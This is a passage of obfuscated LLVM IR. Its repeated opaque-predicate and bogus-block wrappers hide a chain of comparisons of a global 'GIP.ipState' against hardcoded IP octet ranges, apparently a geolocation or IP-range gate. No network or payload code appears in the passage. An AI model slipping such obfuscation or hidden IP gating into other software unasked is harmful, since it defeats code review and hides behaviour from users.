  %3465 = icmp slt i32 %3460, 10
  %3466 = or i1 %3464, %3465
  br i1 %3466, label %originalBB482, label %originalBB482alteredBB

originalBB482:                                    ; preds = %originalBB482alteredBB, %3458
  %3467 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3468 = zext i8 %3467 to i32
  %3469 = icmp slt i32 %3468, 21
  %3470 = load i32, i32* @x.65
  %3471 = load i32, i32* @y.66
  %3472 = sub i32 %3470, 1
  %3473 = mul i32 %3470, %3472
  %3474 = urem i32 %3473, 2
  %3475 = icmp eq i32 %3474, 0
  %3476 = icmp slt i32 %3471, 10
  %3477 = or i1 %3475, %3476
  br i1 %3477, label %originalBBpart2484, label %originalBB482alteredBB

originalBBpart2484:                               ; preds = %originalBB482
  br i1 %3469, label %5298, label %3478

; <label>:3478:                                   ; preds = %originalBBpart2484, %originalBBpart2480, %originalBBpart2476, %originalBBpart2472
  %3479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3480 = zext i8 %3479 to i32
  %3481 = icmp eq i32 %3480, 70
  br i1 %3481, label %3482, label %3526

; <label>:3482:                                   ; preds = %3478
  %3483 = load i32, i32* @x.65
  %3484 = load i32, i32* @y.66
  %3485 = sub i32 %3483, 1
  %3486 = mul i32 %3483, %3485
  %3487 = urem i32 %3486, 2
  %3488 = icmp eq i32 %3487, 0
  %3489 = icmp slt i32 %3484, 10
  %3490 = or i1 %3488, %3489
  br i1 %3490, label %originalBB486, label %originalBB486alteredBB

originalBB486:                                    ; preds = %originalBB486alteredBB, %3482
  %3491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3492 = zext i8 %3491 to i32
  %3493 = icmp eq i32 %3492, 42
  %3494 = load i32, i32* @x.65
  %3495 = load i32, i32* @y.66
  %3496 = sub i32 %3494, 1
  %3497 = mul i32 %3494, %3496
  %3498 = urem i32 %3497, 2
  %3499 = icmp eq i32 %3498, 0
  %3500 = icmp slt i32 %3495, 10
  %3501 = or i1 %3499, %3500
  br i1 %3501, label %originalBBpart2488, label %originalBB486alteredBB

originalBBpart2488:                               ; preds = %originalBB486
  br i1 %3493, label %3502, label %3526

; <label>:3502:                                   ; preds = %originalBBpart2488
  %3503 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3504 = zext i8 %3503 to i32
  %3505 = icmp sge i32 %3504, 73
  br i1 %3505, label %3506, label %3526

; <label>:3506:                                   ; preds = %3502
  %3507 = load i32, i32* @x.65
  %3508 = load i32, i32* @y.66
  %3509 = sub i32 %3507, 1
  %3510 = mul i32 %3507, %3509
  %3511 = urem i32 %3510, 2
  %3512 = icmp eq i32 %3511, 0
  %3513 = icmp slt i32 %3508, 10
  %3514 = or i1 %3512, %3513
  br i1 %3514, label %originalBB490, label %originalBB490alteredBB

originalBB490:                                    ; preds = %originalBB490alteredBB, %3506
  %3515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3516 = zext i8 %3515 to i32
  %3517 = icmp slt i32 %3516, 75
  %3518 = load i32, i32* @x.65
  %3519 = load i32, i32* @y.66
  %3520 = sub i32 %3518, 1
  %3521 = mul i32 %3518, %3520
  %3522 = urem i32 %3521, 2
  %3523 = icmp eq i32 %3522, 0
  %3524 = icmp slt i32 %3519, 10
  %3525 = or i1 %3523, %3524
  br i1 %3525, label %originalBBpart2492, label %originalBB490alteredBB

originalBBpart2492:                               ; preds = %originalBB490
  br i1 %3517, label %5298, label %3526

; <label>:3526:                                   ; preds = %originalBBpart2492, %3502, %originalBBpart2488, %3478
  %3527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3528 = zext i8 %3527 to i32
  %3529 = icmp eq i32 %3528, 74
  br i1 %3529, label %3530, label %3558

; <label>:3530:                                   ; preds = %3526
  %3531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3532 = zext i8 %3531 to i32
  %3533 = icmp eq i32 %3532, 91
  br i1 %3533, label %3534, label %3558

; <label>:3534:                                   ; preds = %3530
  %3535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3536 = zext i8 %3535 to i32
  %3537 = icmp sge i32 %3536, 113
  br i1 %3537, label %3538, label %3558

; <label>:3538:                                   ; preds = %3534
  %3539 = load i32, i32* @x.65
  %3540 = load i32, i32* @y.66
  %3541 = sub i32 %3539, 1
  %3542 = mul i32 %3539, %3541
  %3543 = urem i32 %3542, 2
  %3544 = icmp eq i32 %3543, 0
  %3545 = icmp slt i32 %3540, 10
  %3546 = or i1 %3544, %3545
  br i1 %3546, label %originalBB494, label %originalBB494alteredBB

originalBB494:                                    ; preds = %originalBB494alteredBB, %3538
  %3547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3548 = zext i8 %3547 to i32
  %3549 = icmp slt i32 %3548, 115
  %3550 = load i32, i32* @x.65
  %3551 = load i32, i32* @y.66
  %3552 = sub i32 %3550, 1
  %3553 = mul i32 %3550, %3552
  %3554 = urem i32 %3553, 2
  %3555 = icmp eq i32 %3554, 0
  %3556 = icmp slt i32 %3551, 10
  %3557 = or i1 %3555, %3556
  br i1 %3557, label %originalBBpart2496, label %originalBB494alteredBB

originalBBpart2496:                               ; preds = %originalBB494
  br i1 %3549, label %5298, label %3558

; <label>:3558:                                   ; preds = %originalBBpart2496, %3534, %3530, %3526
  %3559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3560 = zext i8 %3559 to i32
  %3561 = icmp eq i32 %3560, 74
  br i1 %3561, label %3562, label %3590

; <label>:3562:                                   ; preds = %3558
  %3563 = load i32, i32* @x.65
  %3564 = load i32, i32* @y.66
  %3565 = sub i32 %3563, 1
  %3566 = mul i32 %3563, %3565
  %3567 = urem i32 %3566, 2
  %3568 = icmp eq i32 %3567, 0
  %3569 = icmp slt i32 %3564, 10
  %3570 = or i1 %3568, %3569
  br i1 %3570, label %originalBB498, label %originalBB498alteredBB

originalBB498:                                    ; preds = %originalBB498alteredBB, %3562
  %3571 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3572 = zext i8 %3571 to i32
  %3573 = icmp eq i32 %3572, 201
  %3574 = load i32, i32* @x.65
  %3575 = load i32, i32* @y.66
  %3576 = sub i32 %3574, 1
  %3577 = mul i32 %3574, %3576
  %3578 = urem i32 %3577, 2
  %3579 = icmp eq i32 %3578, 0
  %3580 = icmp slt i32 %3575, 10
  %3581 = or i1 %3579, %3580
  br i1 %3581, label %originalBBpart2500, label %originalBB498alteredBB

originalBBpart2500:                               ; preds = %originalBB498
  br i1 %3573, label %3582, label %3590

; <label>:3582:                                   ; preds = %originalBBpart2500
  %3583 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3584 = zext i8 %3583 to i32
  %3585 = icmp sge i32 %3584, 56
  br i1 %3585, label %3586, label %3590

; <label>:3586:                                   ; preds = %3582
  %3587 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3588 = zext i8 %3587 to i32
  %3589 = icmp slt i32 %3588, 58
  br i1 %3589, label %5298, label %3590

; <label>:3590:                                   ; preds = %3586, %3582, %originalBBpart2500, %3558
  %3591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3592 = zext i8 %3591 to i32
  %3593 = icmp eq i32 %3592, 188
  br i1 %3593, label %3594, label %3606

; <label>:3594:                                   ; preds = %3590
  %3595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3596 = zext i8 %3595 to i32
  %3597 = icmp eq i32 %3596, 209
  br i1 %3597, label %3598, label %3606

; <label>:3598:                                   ; preds = %3594
  %3599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3600 = zext i8 %3599 to i32
  %3601 = icmp sge i32 %3600, 48
  br i1 %3601, label %3602, label %3606

; <label>:3602:                                   ; preds = %3598
  %3603 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3604 = zext i8 %3603 to i32
  %3605 = icmp slt i32 %3604, 53
  br i1 %3605, label %5298, label %3606

; <label>:3606:                                   ; preds = %3602, %3598, %3594, %3590
  %3607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3608 = zext i8 %3607 to i32
  %3609 = icmp eq i32 %3608, 188
  br i1 %3609, label %3610, label %3614

; <label>:3610:                                   ; preds = %3606
  %3611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3612 = zext i8 %3611 to i32
  %3613 = icmp eq i32 %3612, 165
  br i1 %3613, label %5298, label %3614

; <label>:3614:                                   ; preds = %3610, %3606
  %3615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3616 = zext i8 %3615 to i32
  %3617 = icmp eq i32 %3616, 149
  br i1 %3617, label %3618, label %3638

; <label>:3618:                                   ; preds = %3614
  %3619 = load i32, i32* @x.65
  %3620 = load i32, i32* @y.66
  %3621 = sub i32 %3619, 1
  %3622 = mul i32 %3619, %3621
  %3623 = urem i32 %3622, 2
  %3624 = icmp eq i32 %3623, 0
  %3625 = icmp slt i32 %3620, 10
  %3626 = or i1 %3624, %3625
  br i1 %3626, label %originalBB502, label %originalBB502alteredBB

originalBB502:                                    ; preds = %originalBB502alteredBB, %3618
  %3627 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3628 = zext i8 %3627 to i32
  %3629 = icmp eq i32 %3628, 202
  %3630 = load i32, i32* @x.65
  %3631 = load i32, i32* @y.66
  %3632 = sub i32 %3630, 1
  %3633 = mul i32 %3630, %3632
  %3634 = urem i32 %3633, 2
  %3635 = icmp eq i32 %3634, 0
  %3636 = icmp slt i32 %3631, 10
  %3637 = or i1 %3635, %3636
  br i1 %3637, label %originalBBpart2504, label %originalBB502alteredBB

originalBBpart2504:                               ; preds = %originalBB502
  br i1 %3629, label %5298, label %3638

; <label>:3638:                                   ; preds = %originalBBpart2504, %3614
  %3639 = load i32, i32* @x.65
  %3640 = load i32, i32* @y.66
  %3641 = sub i32 %3639, 1
  %3642 = mul i32 %3639, %3641
  %3643 = urem i32 %3642, 2
  %3644 = icmp eq i32 %3643, 0
  %3645 = icmp slt i32 %3640, 10
  %3646 = or i1 %3644, %3645
  br i1 %3646, label %originalBB506, label %originalBB506alteredBB

originalBB506:                                    ; preds = %originalBB506alteredBB, %3638
  %3647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3648 = zext i8 %3647 to i32
  %3649 = icmp eq i32 %3648, 151
  %3650 = load i32, i32* @x.65
  %3651 = load i32, i32* @y.66
  %3652 = sub i32 %3650, 1
  %3653 = mul i32 %3650, %3652
  %3654 = urem i32 %3653, 2
  %3655 = icmp eq i32 %3654, 0
  %3656 = icmp slt i32 %3651, 10
  %3657 = or i1 %3655, %3656
  br i1 %3657, label %originalBBpart2508, label %originalBB506alteredBB

originalBBpart2508:                               ; preds = %originalBB506
  br i1 %3649, label %3658, label %3662

; <label>:3658:                                   ; preds = %originalBBpart2508
  %3659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3660 = zext i8 %3659 to i32
  %3661 = icmp eq i32 %3660, 80
  br i1 %3661, label %5298, label %3662

; <label>:3662:                                   ; preds = %3658, %originalBBpart2508
  %3663 = load i32, i32* @x.65
  %3664 = load i32, i32* @y.66
  %3665 = sub i32 %3663, 1
  %3666 = mul i32 %3663, %3665
  %3667 = urem i32 %3666, 2
  %3668 = icmp eq i32 %3667, 0
  %3669 = icmp slt i32 %3664, 10
  %3670 = or i1 %3668, %3669
  br i1 %3670, label %originalBB510, label %originalBB510alteredBB

originalBB510:                                    ; preds = %originalBB510alteredBB, %3662
  %3671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3672 = zext i8 %3671 to i32
  %3673 = icmp eq i32 %3672, 164
  %3674 = load i32, i32* @x.65
  %3675 = load i32, i32* @y.66
  %3676 = sub i32 %3674, 1
  %3677 = mul i32 %3674, %3676
  %3678 = urem i32 %3677, 2
  %3679 = icmp eq i32 %3678, 0
  %3680 = icmp slt i32 %3675, 10
  %3681 = or i1 %3679, %3680
  br i1 %3681, label %originalBBpart2512, label %originalBB510alteredBB

originalBBpart2512:                               ; preds = %originalBB510
  br i1 %3673, label %3682, label %3686

; <label>:3682:                                   ; preds = %originalBBpart2512
  %3683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3684 = zext i8 %3683 to i32
  %3685 = icmp eq i32 %3684, 132
  br i1 %3685, label %5298, label %3686

; <label>:3686:                                   ; preds = %3682, %originalBBpart2512
  %3687 = load i32, i32* @x.65
  %3688 = load i32, i32* @y.66
  %3689 = sub i32 %3687, 1
  %3690 = mul i32 %3687, %3689
  %3691 = urem i32 %3690, 2
  %3692 = icmp eq i32 %3691, 0
  %3693 = icmp slt i32 %3688, 10
  %3694 = or i1 %3692, %3693
  br i1 %3694, label %originalBB514, label %originalBB514alteredBB

originalBB514:                                    ; preds = %originalBB514alteredBB, %3686
  %3695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3696 = zext i8 %3695 to i32
  %3697 = icmp eq i32 %3696, 176
  %3698 = load i32, i32* @x.65
  %3699 = load i32, i32* @y.66
  %3700 = sub i32 %3698, 1
  %3701 = mul i32 %3698, %3700
  %3702 = urem i32 %3701, 2
  %3703 = icmp eq i32 %3702, 0
  %3704 = icmp slt i32 %3699, 10
  %3705 = or i1 %3703, %3704
  br i1 %3705, label %originalBBpart2516, label %originalBB514alteredBB

originalBBpart2516:                               ; preds = %originalBB514
  br i1 %3697, label %3706, label %3710

; <label>:3706:                                   ; preds = %originalBBpart2516
  %3707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3708 = zext i8 %3707 to i32
  %3709 = icmp eq i32 %3708, 31
  br i1 %3709, label %5298, label %3710

; <label>:3710:                                   ; preds = %3706, %originalBBpart2516
  %3711 = load i32, i32* @x.65
  %3712 = load i32, i32* @y.66
  %3713 = sub i32 %3711, 1
  %3714 = mul i32 %3711, %3713
  %3715 = urem i32 %3714, 2
  %3716 = icmp eq i32 %3715, 0
  %3717 = icmp slt i32 %3712, 10
  %3718 = or i1 %3716, %3717
  br i1 %3718, label %originalBB518, label %originalBB518alteredBB

originalBB518:                                    ; preds = %originalBB518alteredBB, %3710
  %3719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3720 = zext i8 %3719 to i32
  %3721 = icmp eq i32 %3720, 167
  %3722 = load i32, i32* @x.65
  %3723 = load i32, i32* @y.66
  %3724 = sub i32 %3722, 1
  %3725 = mul i32 %3722, %3724
  %3726 = urem i32 %3725, 2
  %3727 = icmp eq i32 %3726, 0
  %3728 = icmp slt i32 %3723, 10
  %3729 = or i1 %3727, %3728
  br i1 %3729, label %originalBBpart2520, label %originalBB518alteredBB

originalBBpart2520:                               ; preds = %originalBB518
  br i1 %3721, label %3730, label %3750

; <label>:3730:                                   ; preds = %originalBBpart2520
  %3731 = load i32, i32* @x.65
  %3732 = load i32, i32* @y.66
  %3733 = sub i32 %3731, 1
  %3734 = mul i32 %3731, %3733
  %3735 = urem i32 %3734, 2
  %3736 = icmp eq i32 %3735, 0
  %3737 = icmp slt i32 %3732, 10
  %3738 = or i1 %3736, %3737
  br i1 %3738, label %originalBB522, label %originalBB522alteredBB

originalBB522:                                    ; preds = %originalBB522alteredBB, %3730
  %3739 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3740 = zext i8 %3739 to i32
  %3741 = icmp eq i32 %3740, 114
  %3742 = load i32, i32* @x.65
  %3743 = load i32, i32* @y.66
  %3744 = sub i32 %3742, 1
  %3745 = mul i32 %3742, %3744
  %3746 = urem i32 %3745, 2
  %3747 = icmp eq i32 %3746, 0
  %3748 = icmp slt i32 %3743, 10
  %3749 = or i1 %3747, %3748
  br i1 %3749, label %originalBBpart2524, label %originalBB522alteredBB

originalBBpart2524:                               ; preds = %originalBB522
  br i1 %3741, label %5298, label %3750

; <label>:3750:                                   ; preds = %originalBBpart2524, %originalBBpart2520
  %3751 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3752 = zext i8 %3751 to i32
  %3753 = icmp eq i32 %3752, 178
  br i1 %3753, label %3754, label %3774

; <label>:3754:                                   ; preds = %3750
  %3755 = load i32, i32* @x.65
  %3756 = load i32, i32* @y.66
  %3757 = sub i32 %3755, 1
  %3758 = mul i32 %3755, %3757
  %3759 = urem i32 %3758, 2
  %3760 = icmp eq i32 %3759, 0
  %3761 = icmp slt i32 %3756, 10
  %3762 = or i1 %3760, %3761
  br i1 %3762, label %originalBB526, label %originalBB526alteredBB

originalBB526:                                    ; preds = %originalBB526alteredBB, %3754
  %3763 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3764 = zext i8 %3763 to i32
  %3765 = icmp eq i32 %3764, 32
  %3766 = load i32, i32* @x.65
  %3767 = load i32, i32* @y.66
  %3768 = sub i32 %3766, 1
  %3769 = mul i32 %3766, %3768
  %3770 = urem i32 %3769, 2
  %3771 = icmp eq i32 %3770, 0
  %3772 = icmp slt i32 %3767, 10
  %3773 = or i1 %3771, %3772
  br i1 %3773, label %originalBBpart2528, label %originalBB526alteredBB

originalBBpart2528:                               ; preds = %originalBB526
  br i1 %3765, label %5298, label %3774

; <label>:3774:                                   ; preds = %originalBBpart2528, %3750
  %3775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3776 = zext i8 %3775 to i32
  %3777 = icmp eq i32 %3776, 178
  br i1 %3777, label %3778, label %3798

; <label>:3778:                                   ; preds = %3774
  %3779 = load i32, i32* @x.65
  %3780 = load i32, i32* @y.66
  %3781 = sub i32 %3779, 1
  %3782 = mul i32 %3779, %3781
  %3783 = urem i32 %3782, 2
  %3784 = icmp eq i32 %3783, 0
  %3785 = icmp slt i32 %3780, 10
  %3786 = or i1 %3784, %3785
  br i1 %3786, label %originalBB530, label %originalBB530alteredBB

originalBB530:                                    ; preds = %originalBB530alteredBB, %3778
  %3787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3788 = zext i8 %3787 to i32
  %3789 = icmp eq i32 %3788, 33
  %3790 = load i32, i32* @x.65
  %3791 = load i32, i32* @y.66
  %3792 = sub i32 %3790, 1
  %3793 = mul i32 %3790, %3792
  %3794 = urem i32 %3793, 2
  %3795 = icmp eq i32 %3794, 0
  %3796 = icmp slt i32 %3791, 10
  %3797 = or i1 %3795, %3796
  br i1 %3797, label %originalBBpart2532, label %originalBB530alteredBB

originalBBpart2532:                               ; preds = %originalBB530
  br i1 %3789, label %5298, label %3798

; <label>:3798:                                   ; preds = %originalBBpart2532, %3774
  %3799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3800 = zext i8 %3799 to i32
  %3801 = icmp eq i32 %3800, 37
  br i1 %3801, label %3802, label %3806

; <label>:3802:                                   ; preds = %3798
  %3803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3804 = zext i8 %3803 to i32
  %3805 = icmp eq i32 %3804, 59
  br i1 %3805, label %5298, label %3806

; <label>:3806:                                   ; preds = %3802, %3798
  %3807 = load i32, i32* @x.65
  %3808 = load i32, i32* @y.66
  %3809 = sub i32 %3807, 1
  %3810 = mul i32 %3807, %3809
  %3811 = urem i32 %3810, 2
  %3812 = icmp eq i32 %3811, 0
  %3813 = icmp slt i32 %3808, 10
  %3814 = or i1 %3812, %3813
  br i1 %3814, label %originalBB534, label %originalBB534alteredBB

originalBB534:                                    ; preds = %originalBB534alteredBB, %3806
  %3815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3816 = zext i8 %3815 to i32
  %3817 = icmp eq i32 %3816, 37
  %3818 = load i32, i32* @x.65
  %3819 = load i32, i32* @y.66
  %3820 = sub i32 %3818, 1
  %3821 = mul i32 %3818, %3820
  %3822 = urem i32 %3821, 2
  %3823 = icmp eq i32 %3822, 0
  %3824 = icmp slt i32 %3819, 10
  %3825 = or i1 %3823, %3824
  br i1 %3825, label %originalBBpart2536, label %originalBB534alteredBB

originalBBpart2536:                               ; preds = %originalBB534
  br i1 %3817, label %3826, label %3846

; <label>:3826:                                   ; preds = %originalBBpart2536
  %3827 = load i32, i32* @x.65
  %3828 = load i32, i32* @y.66
  %3829 = sub i32 %3827, 1
  %3830 = mul i32 %3827, %3829
  %3831 = urem i32 %3830, 2
  %3832 = icmp eq i32 %3831, 0
  %3833 = icmp slt i32 %3828, 10
  %3834 = or i1 %3832, %3833
  br i1 %3834, label %originalBB538, label %originalBB538alteredBB

originalBB538:                                    ; preds = %originalBB538alteredBB, %3826
  %3835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3836 = zext i8 %3835 to i32
  %3837 = icmp eq i32 %3836, 187
  %3838 = load i32, i32* @x.65
  %3839 = load i32, i32* @y.66
  %3840 = sub i32 %3838, 1
  %3841 = mul i32 %3838, %3840
  %3842 = urem i32 %3841, 2
  %3843 = icmp eq i32 %3842, 0
  %3844 = icmp slt i32 %3839, 10
  %3845 = or i1 %3843, %3844
  br i1 %3845, label %originalBBpart2540, label %originalBB538alteredBB

originalBBpart2540:                               ; preds = %originalBB538
  br i1 %3837, label %5298, label %3846

; <label>:3846:                                   ; preds = %originalBBpart2540, %originalBBpart2536
  %3847 = load i32, i32* @x.65
  %3848 = load i32, i32* @y.66
  %3849 = sub i32 %3847, 1
  %3850 = mul i32 %3847, %3849
  %3851 = urem i32 %3850, 2
  %3852 = icmp eq i32 %3851, 0
  %3853 = icmp slt i32 %3848, 10
  %3854 = or i1 %3852, %3853
  br i1 %3854, label %originalBB542, label %originalBB542alteredBB

originalBB542:                                    ; preds = %originalBB542alteredBB, %3846
  %3855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3856 = zext i8 %3855 to i32
  %3857 = icmp eq i32 %3856, 46
  %3858 = load i32, i32* @x.65
  %3859 = load i32, i32* @y.66
  %3860 = sub i32 %3858, 1
  %3861 = mul i32 %3858, %3860
  %3862 = urem i32 %3861, 2
  %3863 = icmp eq i32 %3862, 0
  %3864 = icmp slt i32 %3859, 10
  %3865 = or i1 %3863, %3864
  br i1 %3865, label %originalBBpart2544, label %originalBB542alteredBB

originalBBpart2544:                               ; preds = %originalBB542
  br i1 %3857, label %3866, label %3870

; <label>:3866:                                   ; preds = %originalBBpart2544
  %3867 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3868 = zext i8 %3867 to i32
  %3869 = icmp eq i32 %3868, 105
  br i1 %3869, label %5298, label %3870

; <label>:3870:                                   ; preds = %3866, %originalBBpart2544
  %3871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3872 = zext i8 %3871 to i32
  %3873 = icmp eq i32 %3872, 51
  br i1 %3873, label %3874, label %3878

; <label>:3874:                                   ; preds = %3870
  %3875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3876 = zext i8 %3875 to i32
  %3877 = icmp eq i32 %3876, 254
  br i1 %3877, label %5298, label %3878

; <label>:3878:                                   ; preds = %3874, %3870
  %3879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3880 = zext i8 %3879 to i32
  %3881 = icmp eq i32 %3880, 51
  br i1 %3881, label %3882, label %3902

; <label>:3882:                                   ; preds = %3878
  %3883 = load i32, i32* @x.65
  %3884 = load i32, i32* @y.66
  %3885 = sub i32 %3883, 1
  %3886 = mul i32 %3883, %3885
  %3887 = urem i32 %3886, 2
  %3888 = icmp eq i32 %3887, 0
  %3889 = icmp slt i32 %3884, 10
  %3890 = or i1 %3888, %3889
  br i1 %3890, label %originalBB546, label %originalBB546alteredBB

originalBB546:                                    ; preds = %originalBB546alteredBB, %3882
  %3891 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3892 = zext i8 %3891 to i32
  %3893 = icmp eq i32 %3892, 255
  %3894 = load i32, i32* @x.65
  %3895 = load i32, i32* @y.66
  %3896 = sub i32 %3894, 1
  %3897 = mul i32 %3894, %3896
  %3898 = urem i32 %3897, 2
  %3899 = icmp eq i32 %3898, 0
  %3900 = icmp slt i32 %3895, 10
  %3901 = or i1 %3899, %3900
  br i1 %3901, label %originalBBpart2548, label %originalBB546alteredBB

originalBBpart2548:                               ; preds = %originalBB546
  br i1 %3893, label %5298, label %3902

; <label>:3902:                                   ; preds = %originalBBpart2548, %3878
  %3903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3904 = zext i8 %3903 to i32
  %3905 = icmp eq i32 %3904, 5
  br i1 %3905, label %3906, label %3910

; <label>:3906:                                   ; preds = %3902
  %3907 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3908 = zext i8 %3907 to i32
  %3909 = icmp eq i32 %3908, 135
  br i1 %3909, label %5298, label %3910

; <label>:3910:                                   ; preds = %3906, %3902
  %3911 = load i32, i32* @x.65
  %3912 = load i32, i32* @y.66
  %3913 = sub i32 %3911, 1
  %3914 = mul i32 %3911, %3913
  %3915 = urem i32 %3914, 2
  %3916 = icmp eq i32 %3915, 0
  %3917 = icmp slt i32 %3912, 10
  %3918 = or i1 %3916, %3917
  br i1 %3918, label %originalBB550, label %originalBB550alteredBB

originalBB550:                                    ; preds = %originalBB550alteredBB, %3910
  %3919 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3920 = zext i8 %3919 to i32
  %3921 = icmp eq i32 %3920, 5
  %3922 = load i32, i32* @x.65
  %3923 = load i32, i32* @y.66
  %3924 = sub i32 %3922, 1
  %3925 = mul i32 %3922, %3924
  %3926 = urem i32 %3925, 2
  %3927 = icmp eq i32 %3926, 0
  %3928 = icmp slt i32 %3923, 10
  %3929 = or i1 %3927, %3928
  br i1 %3929, label %originalBBpart2552, label %originalBB550alteredBB

originalBBpart2552:                               ; preds = %originalBB550
  br i1 %3921, label %3930, label %3950

; <label>:3930:                                   ; preds = %originalBBpart2552
  %3931 = load i32, i32* @x.65
  %3932 = load i32, i32* @y.66
  %3933 = sub i32 %3931, 1
  %3934 = mul i32 %3931, %3933
  %3935 = urem i32 %3934, 2
  %3936 = icmp eq i32 %3935, 0
  %3937 = icmp slt i32 %3932, 10
  %3938 = or i1 %3936, %3937
  br i1 %3938, label %originalBB554, label %originalBB554alteredBB

originalBB554:                                    ; preds = %originalBB554alteredBB, %3930
  %3939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3940 = zext i8 %3939 to i32
  %3941 = icmp eq i32 %3940, 196
  %3942 = load i32, i32* @x.65
  %3943 = load i32, i32* @y.66
  %3944 = sub i32 %3942, 1
  %3945 = mul i32 %3942, %3944
  %3946 = urem i32 %3945, 2
  %3947 = icmp eq i32 %3946, 0
  %3948 = icmp slt i32 %3943, 10
  %3949 = or i1 %3947, %3948
  br i1 %3949, label %originalBBpart2556, label %originalBB554alteredBB

originalBBpart2556:                               ; preds = %originalBB554
  br i1 %3941, label %5298, label %3950

; <label>:3950:                                   ; preds = %originalBBpart2556, %originalBBpart2552
  %3951 = load i32, i32* @x.65
  %3952 = load i32, i32* @y.66
  %3953 = sub i32 %3951, 1
  %3954 = mul i32 %3951, %3953
  %3955 = urem i32 %3954, 2
  %3956 = icmp eq i32 %3955, 0
  %3957 = icmp slt i32 %3952, 10
  %3958 = or i1 %3956, %3957
  br i1 %3958, label %originalBB558, label %originalBB558alteredBB

originalBB558:                                    ; preds = %originalBB558alteredBB, %3950
  %3959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
